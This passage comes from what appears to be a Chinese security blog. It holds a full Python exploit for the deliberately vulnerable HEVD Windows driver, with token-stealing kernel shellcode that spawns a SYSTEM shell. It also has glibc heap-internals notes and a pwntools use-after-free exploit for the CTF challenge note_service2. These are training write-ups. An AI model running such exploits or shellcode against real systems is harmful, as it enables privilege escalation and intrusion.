class="line">    <span class="string">&quot;\x64\x8b\x80\x24\x01\x00\x00&quot;</span>    <span class="comment"># mov eax,[fs:eax+0x124]</span></span><br><span class="line">    <span class="string">&quot;\x8b\x40\x50&quot;</span>                    <span class="comment"># mov eax,[eax+0x50]</span></span><br><span class="line">    <span class="string">&quot;\x89\xc1&quot;</span>                        <span class="comment"># mov ecx,eax</span></span><br><span class="line">    <span class="string">&quot;\xba\x04\x00\x00\x00&quot;</span>            <span class="comment"># mov edx,0x4</span></span><br><span class="line">    <span class="string">&quot;\x8b\x80\xb8\x00\x00\x00&quot;</span>        <span class="comment"># mov eax,[eax+0xb8]</span></span><br><span class="line">    <span class="string">&quot;\x2d\xb8\x00\x00\x00&quot;</span>            <span class="comment"># sub eax,0xb8</span></span><br><span class="line">    <span class="string">&quot;\x39\x90\xb4\x00\x00\x00&quot;</span>        <span class="comment"># cmp [eax+0xb4],edx</span></span><br><span class="line">    <span class="string">&quot;\x75\xed&quot;</span>                        <span class="comment"># jnz 0x1a</span></span><br><span class="line">    <span class="string">&quot;\x8b\x90\xf8\x00\x00\x00&quot;</span>        <span class="comment"># mov edx,[eax+0xf8]</span></span><br><span class="line">    <span class="string">&quot;\x89\x91\xf8\x00\x00\x00&quot;</span>        <span class="comment"># mov [ecx+0xf8],edx</span></span><br><span class="line">    <span class="string">&quot;\x61&quot;</span>                            <span class="comment"># popad</span></span><br><span class="line"><span class="string">&quot;\x31\xc0&quot;</span>                        <span class="comment"># xor eax,eax</span></span><br><span class="line">    <span class="string">&quot;\x5d&quot;</span>                            <span class="comment"># pop ebp</span></span><br><span class="line">    <span class="string">&quot;\xc2\x08\x00&quot;</span>                     <span class="comment"># ret 0x8</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">ptr = kernel32.VirtualAlloc(c_int(<span class="number">0</span>),c_int(<span class="built_in">len</span>(shellcode)),c_int(<span class="number">0x3000</span>),c_int(<span class="number">0x40</span>))</span><br><span class="line">buff = (c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line"><span class="comment">#用shellcode填充c_char数组</span></span><br><span class="line">kernel32.RtlMoveMemory(c_int(ptr),buff,c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">shellcode_final = struct.pack(<span class="string">&quot;&lt;L&quot;</span>,ptr)<span class="comment">#格式化指针</span></span><br><span class="line"></span><br><span class="line">buf = buf = <span class="string">&quot;A&quot;</span>*<span class="number">2080</span> + shellcode_final</span><br><span class="line">bufLength = <span class="built_in">len</span>(buf)</span><br><span class="line">kernel32.DeviceIoContorl(hevDevice,<span class="number">0x22203</span>,buf,bufLength,<span class="literal">None</span>,<span class="number">0</span>,byref(c_ulong()), <span class="literal">None</span>)</span><br><span class="line"><span class="comment">#byref()将返回一个指针（与byval（）中的值一样）指向作为其参数的变量</span></span><br></pre></td></tr></table></figure><p>windbg跟TriggerStackOverflow </p><p>!sym noisy 让调试器显示符号搜索详细信息</p><p>.reload;ed Kd_DEFAULT_Mask 8;  从路径重新加载符号信息</p><p>bp HEVD!TriggerStackOverflow 在所需的函数上设置断点</p><p>使用virtualAlloc()绕过DEP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">//构造shellcode</span><br><span class="line">pushad ; Save registers state</span><br><span class="line"> </span><br><span class="line">; Start of Token Stealing Stub</span><br><span class="line">xor eax, eax ; Set ZERO</span><br><span class="line">mov eax, fs:[eax + KTHREAD_OFFSET] ; Get nt!_KPCR.PcrbData.CurrentThread</span><br><span class="line">; _KTHREAD is located at FS:[0x124]</span><br><span class="line"> </span><br><span class="line">mov eax, [eax + EPROCESS_OFFSET] ; Get nt!_KTHREAD.ApcState.Process</span><br><span class="line"> </span><br><span class="line">mov ecx, eax ; Copy current process _EPROCESS structure</span><br><span class="line"> </span><br><span class="line">mov edx, SYSTEM_PID ; WIN 7 SP1 SYSTEM process PID = 0x4</span><br><span class="line"> </span><br><span class="line">SearchSystemPID:</span><br><span class="line">mov eax, [eax + FLINK_OFFSET] ; Get nt!_EPROCESS.ActiveProcessLinks.Flink</span><br><span class="line">sub eax, FLINK_OFFSET</span><br><span class="line">cmp [eax + PID_OFFSET], edx ; Get nt!_EPROCESS.UniqueProcessId</span><br><span class="line">jne SearchSystemPID</span><br><span class="line"> </span><br><span class="line">mov edx, [eax + TOKEN_OFFSET] ; Get SYSTEM process nt!_EPROCESS.Token</span><br><span class="line">mov [ecx + TOKEN_OFFSET], edx ; Replace target process nt!_EPROCESS.Token</span><br><span class="line">; with SYSTEM process nt!_EPROCESS.Token</span><br><span class="line">; End of Token Stealing Stub</span><br><span class="line"> </span><br><span class="line">popad ; Restore registers state</span><br></pre></td></tr></table></figure><p>完整exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import ctypes, sys, struct</span><br><span class="line">from ctypes import *</span><br><span class="line">from subprocess import *</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">kernel32 = windll.kernel32</span><br><span class="line"></span><br><span class="line">def create_file():</span><br><span class="line"></span><br><span class="line">    hevd = kernel32.CreateFileA(</span><br><span class="line">        <span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>, </span><br><span class="line">        0xC0000000, </span><br><span class="line">        0, </span><br><span class="line">        None, </span><br><span class="line">        0x3, </span><br><span class="line">        0, </span><br><span class="line">        None)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (not hevd) or (hevd == -1):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Failed to retrieve handle to device-driver with error-code: &quot;</span> + str(GetLastError()))</span><br><span class="line">        sys.exit(1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Successfully retrieved handle to device-driver: &quot;</span> + str(hevd))</span><br><span class="line">        <span class="built_in">return</span> hevd</span><br><span class="line"></span><br><span class="line">def send_buf(hevd):</span><br><span class="line"></span><br><span class="line">    shellcode = bytearray(</span><br><span class="line">    <span class="string">&quot;\x60&quot;</span>                            <span class="comment"># pushad</span></span><br><span class="line">    <span class="string">&quot;\x31\xc0&quot;</span>                        <span class="comment"># xor eax,eax</span></span><br><span class="line">    <span class="string">&quot;\x64\x8b\x80\x24\x01\x00\x00&quot;</span>    <span class="comment"># mov eax,[fs:eax+0x124]</span></span><br><span class="line">    <span class="string">&quot;\x8b\x40\x50&quot;</span>                    <span class="comment"># mov eax,[eax+0x50]</span></span><br><span class="line">    <span class="string">&quot;\x89\xc1&quot;</span>                        <span class="comment"># mov ecx,eax</span></span><br><span class="line">    <span class="string">&quot;\xba\x04\x00\x00\x00&quot;</span>            <span class="comment"># mov edx,0x4</span></span><br><span class="line">    <span class="string">&quot;\x8b\x80\xb8\x00\x00\x00&quot;</span>        <span class="comment"># mov eax,[eax+0xb8]</span></span><br><span class="line">    <span class="string">&quot;\x2d\xb8\x00\x00\x00&quot;</span>            <span class="comment"># sub eax,0xb8</span></span><br><span class="line">    <span class="string">&quot;\x39\x90\xb4\x00\x00\x00&quot;</span>        <span class="comment"># cmp [eax+0xb4],edx</span></span><br><span class="line">    <span class="string">&quot;\x75\xed&quot;</span>                        <span class="comment"># jnz 0x1a</span></span><br><span class="line">    <span class="string">&quot;\x8b\x90\xf8\x00\x00\x00&quot;</span>        <span class="comment"># mov edx,[eax+0xf8]</span></span><br><span class="line">    <span class="string">&quot;\x89\x91\xf8\x00\x00\x00&quot;</span>        <span class="comment"># mov [ecx+0xf8],edx</span></span><br><span class="line">    <span class="string">&quot;\x61&quot;</span>                            <span class="comment"># popad</span></span><br><span class="line">    <span class="string">&quot;\x5d&quot;</span></span><br><span class="line">    <span class="string">&quot;\xc2\x08\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Allocating shellcode character array...&quot;</span>)</span><br><span class="line">    usermode_addr = (c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">    ptr = addressof(usermode_addr)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Marking shellcode RWX...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    result = kernel32.VirtualProtect(</span><br><span class="line">        usermode_addr,</span><br><span class="line">        c_int(len(shellcode)),</span><br><span class="line">        c_int(0x40),</span><br><span class="line">        byref(c_ulong())</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result != 0:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Successfully marked shellcode RWX.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Failed to mark shellcode RWX.&quot;</span>)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    payload = struct.pack(<span class="string">&quot;&lt;L&quot;</span>,ptr)</span><br><span class="line"></span><br><span class="line">    buf = <span class="string">&quot;A&quot;</span> * 2080</span><br><span class="line">    buf += payload</span><br><span class="line">    buf_length = len(buf)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending payload to driver...&quot;</span>)</span><br><span class="line">    result = kernel32.DeviceIoControl(</span><br><span class="line">        hevd,</span><br><span class="line">        0x222003,</span><br><span class="line">        buf,</span><br><span class="line">        buf_length,</span><br><span class="line">        None,</span><br><span class="line">        0,</span><br><span class="line">        byref(c_ulong()),</span><br><span class="line">        None</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result != 0:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Payload sent.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Unable to send payload to driver.&quot;</span>)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Spawning cmd shell with SYSTEM privs...&quot;</span>)</span><br><span class="line">        Popen(</span><br><span class="line">            <span class="string">&#x27;start cmd&#x27;</span>,</span><br><span class="line">            shell=True</span><br><span class="line">        )</span><br><span class="line">    except:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Failed to spawn cmd shell.&quot;</span>)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">hevd = create_file()</span><br><span class="line">send_buf(hevd)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>heapNote</title>
      <link href="/2021/06/29/heapnote/"/>
      <url>/2021/06/29/heapnote/</url>
      
        <content type="html"><![CDATA[<p>应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。<br>如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</p><blockquote><p>小内存： [获取分配区(arena)并加锁] -&gt; fast bin -&gt; unsorted bin -&gt; small bin -&gt; large bin -&gt; top chunk -&gt; 扩展堆大内存： 直接mmap</p></blockquote><p>使用<code>malloc</code>申请内存超过<code>MMAP_THRESHOLD</code>时就会调用<code>mmap</code>申请内存</p><blockquote><p>Normally, malloc() allocates memory from the heap, and adjusts the size of the heap as required, using sbrk(2). When allocating blocks of memory larger than MMAP_THRESHOLD bytes, the glibc malloc() implementation allocates the memory as a private anonymous mapping using mmap(2). MMAP_THRESHOLD is 128 kB by default, but is adjustable using mallopt(3). Allocations performed using mmap(2) are unaffected by the RLIMIT_DATA resource limit (see getrlimit(2)).</p></blockquote><p>申请到的<code>chunk</code>地址在<code>libc</code>和<code>ld</code>附近</p><p>这是比较常见的利用点</p><p>如果chunk中存在溢出或者越界读写漏洞的话，可以泄漏或修改libc或者ld中的值</p><p>简单讲就是第一次申请的内存空间在释放过后没有进行内存回收，导致下次申请内存的时候再次使用该内存块，使得以前的内存指针可以访问修改过的内存。</p><p>管理堆的双向链表链表结构如下：</p><img src="/2021/06/29/heapnote/Untitled.png" class title="Untitled"><p>memory被free后，heap manager还是会记录这些freed块在一个链表‘bin’里，这样再申请时会在这里面找（this is how point 1 do），找到之后标记‘allocated’并返回指向‘user data’的块指针。</p><p>bins:fast bins, the unsorted bin, small bins, large bins, and the per-thread tcache</p><img src="/2021/06/29/heapnote/Untitled1.png" class title="Untitled"><p>Arenas:</p><p>堆管理器用全局互斥锁（mutex）来维护一个内部堆结构来避免程序崩溃，就是保证每次只有一个线程与堆互动。this is how arenas comes</p><p>每个arenas独立维护自己的chunk allocation和free bins.</p><p>当进程创建新线程时，堆管理器会为每个新线程分配secondary arenas，以减少线程在执行malloc和free操作时必须等待。</p><p>我们知道主堆区在程序加载进内存的后面且用brk system call扩展，但secondary arenas不能如此，</p><p>secondary arenas模拟main heap的行为，使用一个或者多个<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/arena.c;h=efca2bcf682667c618e285b2357888d10d336c5f;hb=HEAD#l452">subheaps</a>来创建（using mmap and mprotect）。</p><p>subheaps:</p><p>初始化堆（main arena）用sbrk动态扩展，而子堆使用mmap定位到内存中，堆管理器用mprotect手动模拟子堆增长。</p><img src="/2021/06/29/heapnote/Untitled2.png" class title="Untitled"><p>堆分配的chunk结构如下：</p><img src="/2021/06/29/heapnote/Untitled3.png" class title="Untitled"><p><strong>small chunks 分配规则：</strong></p><p>1.如果有刚free的chunk（存在bin里），且满足申请的大小，那么就用这个。</p><p>2.不行的话，如果heap顶有可用空间，就从中取之。</p><p>3.再不行的话，向kernel申请内存 (using sbrk()) 到heap底（end of heap），在这块新空间中取之。</p><p>4.再不行就error返回NULL。</p><p>chunk metadata:chunk的结构</p><img src="/2021/06/29/heapnote/Untitled4.png" class title="Untitled"><p><code>mchunk_size</code> 存储4样东西 ：this chunk size +’A’’M’’P’，分别存储在同样的size_t里，因为这些chunk sizes一般是8byte对齐（16byte对齐on64bit）,因此最后3bits的chunk size总是为0 </p><p>“A”：用于告诉堆管理器该块是否属于secondary arena(subheap)，而不是main arena。在 free时，堆管理器只得到一个指向程序员想要释放的分配的指针，堆管理器需要计算出该指针属于哪个领域。如果在块的元数据中设置了 A 标志，堆管理器必须搜索每个区域并查看指针是否位于该区域的任何子堆(subheap)中。如果未设置该标志，堆管理器可以缩短搜索，因为它知道块来自初始堆（initial arena&#x2F;main arena）。</p><p>“M”：标志用于指示该块是通过 mmap 在堆外分配的巨大分配。当这个分配最终被传递回 free 时，堆管理器将立即通过 munmap 将整个块返回给操作系统，而不是尝试回收它。出于这个原因，释放的块永远不会设置这个标志。</p><p>“P”：它表示前一个块是空闲块。这意味着当这个块被释放时，它可以安全地连接到前一个块上以创建一个更大的空闲块。</p><img src="/2021/06/29/heapnote/Untitled5.png" class title="Untitled"><p>Glibc heap:</p><p>free在操作指向chunk块的删减时候，会进行一系列检查来确保改块chunk是没在使用的：</p><ul><li>检查对齐：8byte on 32,16byte on 64</li><li>检查该块的大小字段是否不可能–要么是太小，要么是太大，要么不是对齐的大小，要么是会与进程的地址空间的末端重叠</li><li>检查大块位于arena的边界之内</li><li>通过检查位于下一个块开始的元数据中的相应的 “P “位，检查该块是否已经被标记为free</li></ul><p><strong>FREE CHUNK METADATA:</strong></p><img src="/2021/06/29/heapnote/Untitled6.png" class title="Untitled"><p>free掉的块也会存储这些边界信息来保证空闲块也能很快的凝聚在一起</p><h1 id="例题：-note-service2-UAF"><a href="#例题：-note-service2-UAF" class="headerlink" title="例题：**note_service2(**UAF)"></a>例题：**note_service2(**UAF)</h1><img src="/2021/06/29/heapnote/Untitled7.png" class title="Untitled"><p>**step1:**我们把shellcode分开，存储到多个堆里，然后在每个堆的最后2字节空间，填上jmp short xxxx指令，让它跳转到下一个堆里去执行代码。</p><blockquote><p>其中jmp short xxx中的xxx计算公式</p><p>xxx &#x3D; 目标地址-当前地址-2</p></blockquote><p><strong>step2：</strong>创建堆的时候是按顺序创建下来的，并且期间没有进行删除操作，我们的堆统一为8字节(根据64位堆的数据结构，至少保证有prev_size、size、fd、bk的空间，实际上的大小为8 align to 32 &#x3D; 32字节)，并且，使用中的堆块的fd和bk被当成数据区，因此我们的数据是从这里开始的，导致后面还有0x8字节空数据。</p><img src="/2021/06/29/heapnote/Untitled8.png" class title="Untitled"><p>从chunk0的jmp出跳到chunk1的data处xxxx执行新代码，那么我们jmp short后面的偏移为</p><p>next &#x3D; (2+1+8 + 8 + 8  - 2) &#x3D; 25&#x3D;0x19</p><blockquote><p>注意那个末尾的1字节0，是输入函数给我们加上的，我们真正只能使用data区的7个字节，也就是我们的每个块里最多放7个字节的指令</p></blockquote><p>**step3:**构造shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">codex=(asm(&quot;mov rdi,&#x27;/bin/sh&#x27;&quot;+&#x27;\x90\x90\xeb\x19&#x27;)#明显超范围了</span><br><span class="line">code0=(asm(&#x27;xor rax,rax&#x27;)+&#x27;\x90\x90\xeb\x19&#x27;)#左填充“\x90”保证7字节（右对齐）</span><br><span class="line">code1=(asm(&#x27;mov eax,0x3b&#x27;)+&#x27;\xeb\x19&#x27;)</span><br><span class="line">code2=(asm(&#x27;xor rsi,rsi&#x27;)+&#x27;\x90\x90\xeb\x19&#x27;)</span><br><span class="line">code3=(asm(&#x27;xor rdx,rdx&#x27;)+&#x27;\x90\x90\xeb\x19&#x27;)</span><br><span class="line">code4=(asm(&#x27;syscall&#x27;).ljust(7,&#x27;\x90&#x27;))#用ljust进行右填充（左对齐）</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>关键是rdi的值，在这里，如果我们将atoi的got表内容指向我们的第一个堆空间,那么当我们下一次输入选项时，我们输入&#x2F;bin&#x2F;sh就可以运行shellcode</p><img src="/2021/06/29/heapnote/Untitled9.png" class title="Untitled"><p>**step4:**把任意的地方的8字节数据写成新建的堆的地址指针，通过数组越界也就是事先创建第一个堆用来占用那个空间，最后的时候delete掉后再申请回来(fastbin特性)，我们可以把一些函数的GOT表内容修改为堆指针，由于程序NX保护是关闭的，那么堆栈里的数据也可以当成指令执行。那么我们在堆里布置shellcode即可。</p><img src="/2021/06/29/heapnote/Untitled10.png" class title="Untitled"><img src="/2021/06/29/heapnote/Untitled11.png" class title="Untitled"><p>偏移为0x40&#x2F;8 &#x3D; 8字节，也就是说,数组下标-8处就是atoi的GOT表</p><blockquote><p>分析代码可知“atoi”的参数是“read”读取来的，此处读入“&#x2F;bin&#x2F;sh”就可以代替codex了</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">53787</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your choice&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;content:&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your choice&gt;&gt; &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">code0=(asm(<span class="string">&#x27;xor rax,rax&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)</span><br><span class="line">code1=(asm(<span class="string">&#x27;mov eax,0x3b&#x27;</span>)+<span class="string">&#x27;\xeb\x19&#x27;</span>)</span><br><span class="line">code2=(asm(<span class="string">&#x27;xor rsi,rsi&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)</span><br><span class="line">code3=(asm(<span class="string">&#x27;xor rdx,rdx&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)</span><br><span class="line">code4=(asm(<span class="string">&#x27;syscall&#x27;</span>).ljust(<span class="number">7</span>,<span class="string">&#x27;\x90&#x27;</span>))</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,code0)</span><br><span class="line">malloc(<span class="number">1</span>,code1)</span><br><span class="line">malloc(<span class="number">2</span>,code2)</span><br><span class="line">malloc(<span class="number">3</span>,code3)</span><br><span class="line">malloc(<span class="number">4</span>,code4)</span><br><span class="line"><span class="comment">#删除第一个堆块</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#把第一个堆块申请回来，存入指令，并且把堆指针赋值给数组的-8下标处(atoi的GOT表处)</span></span><br><span class="line"><span class="comment">#即修改了atoi的GOT表为我们的code0,下次调用atoi时调用的是指向code0的指针</span></span><br><span class="line">malloc(-<span class="number">8</span>,code0)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="例题：noleak（mallochook-UAF）"><a href="#例题：noleak（mallochook-UAF）" class="headerlink" title="例题：noleak（mallochook+UAF）"></a>例题：noleak（mallochook+UAF）</h1><p>由于没开PIE，bss段可以随便使用</p><p>RELRO是完全开启的，不能通过修改GOT表来进行攻击</p><p>讲堆的<a href="https://paper.seebug.org/papers/Archive/refs/heap/">https://paper.seebug.org/papers/Archive/refs/heap/</a></p><h2 id="堆管理机制：bin"><a href="#堆管理机制：bin" class="headerlink" title="堆管理机制：bin"></a><strong>堆管理机制：bin</strong></h2><p>一个链表被称为一个bin，简单来说bin就是<strong>free chunk的容器</strong></p><p><strong>unsorted bin</strong>是一段特殊的bin，由free chunks组成的循环双链表，当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到<strong>unsorted bin</strong>中</p><h2 id="堆管理机制：chunk"><a href="#堆管理机制：chunk" class="headerlink" title="堆管理机制：chunk"></a><strong>堆管理机制：chunk</strong></h2><p><strong>1.allocated chunk</strong>：当前chunk是被应用层用户所使用的</p><p><strong>2.free chunk</strong>：当前chunk是空闲的，没有被应用层用户所使用</p><p><strong>3.top chunk</strong>：当一个chunk处于一个arena的最顶部(即最高内存地址处)的时候，就称之为top chunk</p><p>该chunk并<strong>不属于任何bin</strong>，而是在系统当前的<strong>所有free chunk</strong>(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用</p><p><strong>4.last remainter chunk</strong>：如果在bins链中存在freechunk时，当我们去malloc的时候，malloc的请求大小比freechunk的大小小，那么arena就会切割这个freechunk给malloc使用，那么切割之后剩余的chunk就<strong>被称为“last remainder”</strong></p><h2 id="堆管理机制：ptmalloc算法"><a href="#堆管理机制：ptmalloc算法" class="headerlink" title="堆管理机制：ptmalloc算法"></a><strong>堆管理机制：ptmalloc算法</strong></h2><img src="/2021/06/29/heapnote/Untitled12.png" class title="Untitled"><p>每个arena理的chunks只有两种状态：in used or free.这些chunk放在bin上，分为fastbin、sort、large、small.</p><p>malloc_hook机制是通过重新指定内存管理的回调函数指针来实现自定义的内存管理方式，在调用对应的malloc等函数的时候，将会被自动调用到自定义的函数,malloc机制中的unsorted bin、small bins以及large bins中的双向链表中的<strong>第一个chunk以及最后一个chunk中的 fd\bk 字段，都指向了一个结构(类型为malloc_state，变量名称为arena)的固定偏移的位置</strong>，当free一个unsorted bin时，它的fd指针会指向libc中main_arena地址附近处。而在这个结构之上的固定偏移位置，则是 __malloc_hook 的地址(其值被默认设置为null).</p><img src="/2021/06/29/heapnote/Untitled13.png" class title="Untitled"><img src="/2021/06/29/heapnote/Untitled14.png" class title="Untitled"><h2 id="Unlink机制："><a href="#Unlink机制：" class="headerlink" title="Unlink机制："></a><strong>Unlink机制：</strong></h2><p>为了把指针移动到要操作的地址附近</p><p>假如我们有一个这样的堆</p><p>Chunk0(空闲)</p><p>Prevsize&#x3D;0   size&#x3D;0x101</p><p>Fd &#x3D;0x6020C8  BK &#x3D;0x6020D0</p><p>DATA&#x3D;XXXXXXXXXXXXXXXXXXXX</p><p>Chunk1(使用中)</p><p>Prevsize&#x3D;0x100 size&#x3D;0x100</p><p>DATA&#x3D;xxxxxxxxxxxxxxxxxxxx</p><p>那么，当我们释放chunk1的时候,会与chunk0发生unlink</p><p>首先，内存管理程序检查chunk1的size&#x3D;0x100，即最后的一个bit为0，说明前一个chunk处于空闲状态，那么，它会与前一个块发生合并，即从unsorted bin双向链表里删除前一个块，然后与自己合并后再加入unsorted bin。</p><p>那么会调用unlink(prev_chunk(chunk1),NULL,NULL)在unlink函数中</p><p>P &#x3D; chunk0</p><p>FD&#x3D;chunk0-&gt;fd &#x3D; 0x6020C8</p><p>BK&#x3D;chunk0-&gt;bk &#x3D; 